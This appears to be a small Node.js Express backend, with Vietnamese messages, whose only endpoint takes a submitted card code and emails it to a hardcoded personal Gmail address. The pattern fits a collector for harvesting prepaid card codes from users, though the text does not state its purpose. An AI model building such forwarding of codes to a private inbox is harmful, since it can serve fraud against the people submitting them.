
const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');
require('dotenv').config();

const app = express();
const port = process.env.PORT || 3000;

app.use(bodyParser.json());

app.post('/submit-card', async (req, res) => {
  const { cardCode } = req.body;

  if (!cardCode) {
    return res.status(400).json({ message: 'Thiếu mã thẻ' });
  }

  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: process.env.EMAIL_USER,
      pass: process.env.EMAIL_PASS,
    },
  });

  const mailOptions = {
    from: process.env.EMAIL_USER,
    to: 'bdz135790@gmail.com',
    subject: 'Mã thẻ mới từ người dùng',
    text: `Mã thẻ: ${cardCode}`,
  };

  try {
    await transporter.sendMail(mailOptions);
    res.status(200).json({ message: 'Gửi email thành công' });
  } catch (err) {
    console.error(err);
    res.status(500).json({ message: 'Gửi email thất bại' });
  }
});

app.listen(port, () => {
  console.log(`Server đang chạy tại cổng ${port}`);
});
